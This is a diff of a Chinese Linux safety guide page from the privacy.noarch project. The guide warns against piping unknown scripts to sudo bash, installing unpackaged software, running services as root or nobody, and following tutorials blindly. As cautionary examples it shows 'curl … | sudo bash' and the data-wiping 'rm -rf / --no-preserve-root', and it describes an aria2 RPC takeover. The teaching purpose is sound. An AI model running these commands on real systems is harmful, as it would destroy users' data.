@@ -85,8 +85,9 @@
 <!-- mods to the vanilla sidebar-->
 <hr/>
 <p>© 2020-2021 <code>privacy.noarch</code> project.</p>
+<p><b>无广告，无追踪，无跨站请求，可退出的 CDN.</b> privacy.noarch 致力于维持互联网该有的样子。</p>
 <p><a href="https://t.me/privacy_noarch" target="_blank"><img height="20" src="/images/badge-telegram.svg"/></a></p>
-<p><a href="https://git.n0ar.ch/privacy" target="_blank"><img height="20" src="/images/badge-git.svg"/></a></p>
+<p><a href="https://github.com/noarchwastaken/privacy" target="_blank"><img height="20" src="/images/badge-git.svg"/></a></p>
 <p><a href="https://www.gnu.org/licenses/fdl-1.3.html" target="_blank"><img height="20" src="/images/badge-gfdl.svg"/></a></p>
 </div>
 <div class="sidebar-resize-handle" id="sidebar-resize-handle"></div>
@@ -162,22 +163,22 @@
 <pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
 </code></pre>
 <p>上面的一行命令，你看着熟悉吗？</p>
-<p><em>noarch</em> 现在告诉你，这个你将要运行的 <code>dolor.sh</code> 内容是这样的：</p>
+<p>noarch 现在告诉你，这个你将要运行的 <code>dolor.sh</code> 内容是这样的：</p>
 <pre><code>rm -rf / --no-preserve-root
 </code></pre>
 <p>如果你在使用 GNU/Linux 或 *BSD, 运行它会删除你电脑上的所有数据，需要你耗费大量精力找回。</p>
 <p>这类操作系统自由度极高，但也代表着人为损坏的门槛更低；因此你需要在使用时多加注意。</p>
-<p>下面是 <em>noarch</em> 在数年 GNU/Linux 使用过程中总结出的 do's &amp; don'ts.</p>
+<p>下面是 noarch 在数年 GNU/Linux 使用过程中总结出的 do's &amp; don'ts.</p>
 <h2 id="不-运行未知脚本"><a class="header" href="#不-运行未知脚本"><em>不：</em> 运行未知脚本</a></h2>
-<p>我们再来看下开头 <em>noarch</em> 提到的命令：</p>
+<p>我们再来看下开头 noarch 提到的命令：</p>
 <pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
 </code></pre>
 <p>它其中的管道符号 <code>|</code> 代表所有从 <code>curl</code> 输出的内容均会被盲目地被 <code>sudo bash</code> 执行。</p>
 <p>你可能会问，<em>那我是不是就不要运行脚本了？</em></p>
-<p>当然不是。前提是你<em>在运行脚本之前了解自己在运行些什么。</em> <em>noarch</em> 取这个使用管道符号运行脚本的例子，还强调审核脚本的重要性。</p>
-<p><em>noarch</em> 建议你在运行任何脚本之前，先下载下来粗略阅读一遍，然后再给它可执行权限运行。这样你至少知道自己在运行什么。</p>
+<p>当然不是。前提是你<em>在运行脚本之前了解自己在运行些什么。</em> noarch 取这个使用管道符号运行脚本的例子，还强调审核脚本的重要性。</p>
+<p>noarch 建议你在运行任何脚本之前，先下载下来粗略阅读一遍，然后再给它可执行权限运行。这样你至少知道自己在运行什么。</p>
 <h3 id="你真的需要一键脚本吗"><a class="header" href="#你真的需要一键脚本吗">你真的需要一键脚本吗？</a></h3>
-<p><em>noarch</em> 的个人意见：<em>使用他人的一键脚本，可视化面板等不是学习 Unix 的好方法。</em></p>
+<p>noarch 的个人意见：<em>使用他人的一键脚本，可视化面板等不是学习 Unix 的好方法。</em></p>
 <p>脚本没法覆盖所有使用情况，不知道目标机器的硬件配置，因此往往只能取一个“刚好能运行”的配置。</p>
 <p>例如，如果你使用一个脚本配置 LNMP (Linux + Nginx + MySQL + PHP), 你的 Nginx 配置可能不会禁用不安全的 HTTP, 并且未启用<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">严格传输安全</a>。</p>
 <p>这让你的网站暴露于 TLS 降级攻击：一个过度简单的描述就是中间人攻击者拦截客户端开始 HTTPS 通讯的请求，使得客户端只使用 HTTP 访问你的网站。攻击者再可以由此窃取你用户的帐号密码，修改你网站的内容...</p>
@@ -234,7 +235,7 @@
 <p>当你运行 <code>make install</code> 时，你在运行开发者给你的一个安装脚本；根据你 <code>./configure</code> 时配置的选项，它可能会将软件安装到 <code>/usr/local/</code>. 这样还好，因为这个地方专属于“野包”；</p>
 <p>但是，类似于<a href="#%E4%B8%8D-%E8%BF%90%E8%A1%8C%E6%9C%AA%E7%9F%A5%E8%84%9A%E6%9C%AC">不运行未知脚本</a>，请在 <code>make install</code> 前检查 <code>Makefile</code>, 确保你能将它卸载干净。你也可以使用 <code>debuild</code> 来与 Makefile 交互，自己创建一个相对好一点（至少能被 <code>dpkg</code> 追踪）的“野包”。</p>
 <h3 id="别无选择"><a class="header" href="#别无选择">别无选择？</a></h3>
-<p>有意思的是，<em>noarch</em> 上面讲到的“野包”之一就是安全运行野包的一个方法。</p>
+<p>有意思的是，noarch 上面讲到的“野包”之一就是安全运行野包的一个方法。</p>
 <p>你可以使用 Podman 或 Docker 运行一个发行版容器，然后在容器里安装野包。任务完成后，把容器删除即可。如果你需要更多安全性，虚拟机也是一个好主意。</p>
 <h2 id="不-使用静默选项"><a class="header" href="#不-使用静默选项"><em>不：</em> 使用静默选项</a></h2>
 <p><img alt="apt 自动删除出现问题" loading="lazy" src="images/apt-disaster.png"/></p>
@@ -245,39 +246,39 @@
 <p>一直使用 <code>root</code> 账户登录，除了严重安全问题之外，你还被暴露在手滑的风险下。</p>
 <p>例如你想 <code>rm -rf ./*</code>, 却多打了一个空格，变成了 <code>rm -rf . /*</code>, 这个操作不仅不会触发 preserve-root, 并且后果与直接删除 <code>/</code> 没有什么区别。</p>
 <h3 id="不-root-运行服务"><a class="header" href="#不-root-运行服务"><em>不：</em> <code>root</code> 运行服务</a></h3>
-<p><em>noarch</em> 再举一个例子：你使用 <a href="https://aria2.github.io/">aria2</a> 搭建了一个下载机。</p>
+<p>noarch 再举一个例子：你使用 <a href="https://aria2.github.io/">aria2</a> 搭建了一个下载机。</p>
 <p>你对安全并非完全不重视，使用了 ssh key 登录，并且限制了可以访问 ssh 的 IP 地址。</p>
 <p>但你犯了一个错误：你在 <code>root</code> 登录的情况下使用 <code>nohup</code> 在后台运行 <code>aria2c</code>, 并且暴露了 RPC 端口。</p>
 <p>在不利用任何 0day 的情况下，攻击者只需要找出你的 aria2 RPC 密钥（你为了方便，它多半是一个弱密码），然后下载他的 ssh 公钥到 <code>/root/.ssh/authorized_keys</code>, 这台机器就是他的了。</p>
-<p><em>noarch</em> 推荐的使用方法是为 <code>aria2c</code> 创建一个专门，低权限的用户，然后将它以这个用户运行；你还可以为它创建一个 <code>systemd</code> 服务，指定运行时的用户和组，或者使用 <code>systemd</code> 的<a href="https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=">动态用户</a>功能。</p>
+<p>noarch 推荐的使用方法是为 <code>aria2c</code> 创建一个专门，低权限的用户，然后将它以这个用户运行；你还可以为它创建一个 <code>systemd</code> 服务，指定运行时的用户和组，或者使用 <code>systemd</code> 的<a href="https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=">动态用户</a>功能。</p>
 <h3 id="不-nobody-运行服务"><a class="header" href="#不-nobody-运行服务"><em>不：</em> <code>nobody</code> 运行服务</a></h3>
 <blockquote>
 <p><i class="fas fa-check-circle"></i> 感谢 <a href="https://t.me/karuboniru">@Karuboniru</a> 的勘误！</p>
 </blockquote>
 <p>你可能觉得，系统里最低权限的用户是 <code>nobody</code>, 也确实有很多教程叫你把服务在 <code>nobody</code> 下运行。<em>那么以后低权限的进程都用 <code>nobody</code>?</em></p>
-<p>很抱歉，这是一个误导。<em>noarch</em> 在<a href="https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a">本章第一版</a>时也犯了这个错误。</p>
+<p>很抱歉，这是一个误导。noarch 在<a href="https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a">本章第一版</a>时也犯了这个错误。</p>
 <p>使用 <code>nobody</code> 运行服务，会使你的服务意外获得其它在 <code>nobody</code> 下的资源。<code>nobody</code> 还被 Linux 内核<a href="https://fedoraproject.org/wiki/Changes/RenameNobodyUser">用来映射无法映射到当前命名空间内的 UID</a>, 例如 NFS 使用的 32 位 UID.</p>
 <h2 id="不-盲目跟随教程"><a class="header" href="#不-盲目跟随教程"><em>不：</em> 盲目跟随“教程”</a></h2>
 <p><img alt="错误指引" loading="lazy" src="images/bad-advice.jpg"/></p>
 <p>图源：<a href="https://t.me/ducksoft">@ducksoft</a></p>
 <p>刚看完上一节<a href="#%E4%B8%8D-%E5%AE%89%E8%A3%85%E9%87%8E%E5%8C%85">不安装野包</a>，你应该意识到上图的行为像是自杀。它将 <code>rpm</code> 包强行安装在基于 Debian 的发行版上，后果可想而知...</p>
-<p>包括 <em>noarch</em> 在内，互联网上的教程编者也经常犯错误，或者无法及时更新他们的教程。（就看上一节<a href="">不 <code>nobody</code> 运行服务</a>！）</p>
+<p>包括 noarch 在内，互联网上的教程编者也经常犯错误，或者无法及时更新他们的教程。（就看上一节<a href="">不 <code>nobody</code> 运行服务</a>！）</p>
 <p>盲目跟随这些教程可能使你陷入死胡同，使用一个已经被抛弃的配置，例如在 Nginx 上启用 SSLv3. （永远别尝试在生产环境上这么做！）</p>
 <p>如果你觉得你在遵循的教程有点奇怪或过时，请阅读 man pages.</p>
 <h2 id="最好-阅读-man-pages"><a class="header" href="#最好-阅读-man-pages"><em>最好：</em> 阅读 man pages</a></h2>
 <p>说起 man pages, 它是学习类 Unix 系统的最好方法：软件的官方文档通常就被打包为 man pages - 文档页。</p>
-<p>例如，<em>noarch</em> 要为自己搭建一个 <code>cgit</code> 可视化，而我不知道如何配置 <code>cgitrc</code> (<code>cgit</code> 的配置文件)。</p>
-<p>这时 <em>noarch</em> 只需要运行 <code>man cgitrc</code>, 这个由 <code>cgit</code> 开发者写的文档内就告诉了 <em>noarch</em> 这个配置文件的格式，配置项以及它们的用途。比网上某个教程可靠得多！</p>
+<p>例如，noarch 要为自己搭建一个 <code>cgit</code> 可视化，而我不知道如何配置 <code>cgitrc</code> (<code>cgit</code> 的配置文件)。</p>
+<p>这时 noarch 只需要运行 <code>man cgitrc</code>, 这个由 <code>cgit</code> 开发者写的文档内就告诉了 noarch 这个配置文件的格式，配置项以及它们的用途。比网上某个教程可靠得多！</p>
 <p>阅读 man pages 可能比盲目跟随网上教程耗时长，但它绝对能给你省下后续解决问题的时间。</p>
 <p>如果你是 *BSD 用户，因为互联网上几乎没有傻瓜式教程，阅读 man pages 几乎是你生活不可或缺的一部分。</p>
 <h2 id="最好-定期备份"><a class="header" href="#最好-定期备份"><em>最好：</em> 定期备份</a></h2>
-<p>如果你在 <code>privacy.noarch</code> 的 <a href="https://privacy.n0ar.ch/chat">Telegram 群</a>内活跃，你应该知道 <em>noarch</em> 使用 <a href="https://btrfs.wiki.kernel.org/index.php/Main_Page">Btrfs</a>.</p>
-<p>Btrfs 的<a href="https://en.wikipedia.org/wiki/Copy-on-write">写入时复制</a>特性为 <em>noarch</em> 的日常备份带来了极大便利；并且它也多次在 <em>noarch</em> 搞坏系统时拉了我一把。</p>
-<p>别急着转换文件系统到 Btrfs; <em>noarch</em> 想要传达的信息是，时常备份系统能在你玩脱时把你救回来。</p>
+<p>如果你在 <code>privacy.noarch</code> 的 <a href="https://privacy.n0ar.ch/chat">Telegram 群</a>内活跃，你应该知道 noarch 使用 <a href="https://btrfs.wiki.kernel.org/index.php/Main_Page">Btrfs</a>.</p>
+<p>Btrfs 的<a href="https://en.wikipedia.org/wiki/Copy-on-write">写入时复制</a>特性为 noarch 的日常备份带来了极大便利；并且它也多次在 noarch 搞坏系统时拉了我一把。</p>
+<p>别急着转换文件系统到 Btrfs; noarch 想要传达的信息是，时常备份系统能在你玩脱时把你救回来。</p>
 <p>无论是云服务器提供商的“快照”功能，还是简单地复制 <code>home</code> 目录，保留对你而言重要的数据是“不玩脱”重要的一环。</p>
 <h2 id="最好-拥抱自由软件"><a class="header" href="#最好-拥抱自由软件"><em>最好：</em> 拥抱自由软件</a></h2>
 <p>运行着 GNU/Linux, 却还在寻找运行 Microsoft Office, Adobe Photoshop, Discord 等专有软件的方法？</p>
-<p>这可能是现在的你，这也是曾经的 <em>noarch</em>.</p>
+<p>这可能是现在的你，这也是曾经的 noarch.</p>
 <p>在 GNU/Linux 或 *BSD 上运行专有软件，专有软件会将你作为“二等公民”对待。</p>
 <p>这是因为他们根本不关心，或是很少关心这些用户的体验：2020 年，GNU/Linux 和 *BSD 的<a href="https://gs.statcounter.com/os-market-share/all/worldwide/2020">桌面市场占有率加起来还不到 MacOS 的七分之一</a>。</p>
 <p>而自由软件则是另一个故事了：它们的作者往往自己使用 GNU/Linux 或 *BSD，许多还专门为这些操作系统构建。</p>
@@ -287,15 +288,15 @@
 <p><i class="fas fa-info-circle"></i> <code>privacy.noarch</code> 的首要任务之一就是让你更快上手各类自由软件！</p>
 </blockquote>
 <h2 id="多问问题问好问题"><a class="header" href="#多问问题问好问题">多问问题，问好问题</a></h2>
-<p>虽然作为一个 <del>内向的作曲家</del>，但是 <em>noarch</em> 依然想在最后说：<strong>请利用好社区资源。</strong></p>
+<p>虽然作为一个 <del>内向的作曲家</del>，但是 noarch 依然想在最后说：<strong>请利用好社区资源。</strong></p>
 <p>GNU/Linux 和 *BSD 由数千个组件构成，当你遇到问题时，请弄清楚是哪个组件引发了你的问题；</p>
 <p>例如，你的电脑经常在使用过程中突然卡住，请查阅 <code>syslog</code>, 查出到底是某个软件，桌面环境，还是内核引起的问题。</p>
 <p>在你找出出问题的组件之后，请去它们对应的 bug tracker 搜索；因为如果你的问题确实由一个最近出现的 bug 引起，搜索引擎没法及时索引 bug tracker.</p>
-<p>例如 <em>noarch</em> 在 Linux 5.7 发布时遇到了<a href="https://bugzilla.kernel.org/show_bug.cgi?id=207383">一个巨大的 bug</a>, 它影响了所有 Polaris 11 架构的 AMD 显卡，包括 <em>noarch</em> 的 RX580 在内，使得 Linux 内核在运行几分钟到几十分钟不等时 panic.</p>
-<p><em>noarch</em> 在搜索引擎搜索无果，自己编译内核无果，后来才在 Linux kernel bugzilla 找到了这个问题。虽然没有参与测试，但 <em>noarch</em> 也得到了解决方案：将内核降级。幸运的是，降级到 Linux 5.6 之后，这个问题就消失了。</p>
+<p>例如 noarch 在 Linux 5.7 发布时遇到了<a href="https://bugzilla.kernel.org/show_bug.cgi?id=207383">一个巨大的 bug</a>, 它影响了所有 Polaris 11 架构的 AMD 显卡，包括 noarch 的 RX580 在内，使得 Linux 内核在运行几分钟到几十分钟不等时 panic.</p>
+<p>noarch 在搜索引擎搜索无果，自己编译内核无果，后来才在 Linux kernel bugzilla 找到了这个问题。虽然没有参与测试，但 noarch 也得到了解决方案：将内核降级。幸运的是，降级到 Linux 5.6 之后，这个问题就消失了。</p>
 <p>如果你对问问题有更多的疑惑，可以参考<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a>，它围绕 Hacker 社区的传统，详细讲解了如何问关于软件的问题。</p>
 <hr/>
-<p>如果你发现 <em>noarch</em> 在本章漏了哪些重要内容，请别犹豫，<a href="https://t.me/noarchwastaken">问 <em>noarch</em></a> 或者为 <code>privacy.noarch</code> <a href="https://github.com/noarchwastaken/privacy/pulls">加上你想要的内容</a>。</p>
+<p>如果你发现 noarch 在本章漏了哪些重要内容，请别犹豫，<a href="https://t.me/noarchwastaken">问 noarch</a> 或者为 <code>privacy.noarch</code> <a href="https://github.com/noarchwastaken/privacy/pulls">加上你想要的内容</a>。</p>
 </main>
 <nav aria-label="Page navigation" class="nav-wrapper">
 <!-- Mobile navigation buttons -->
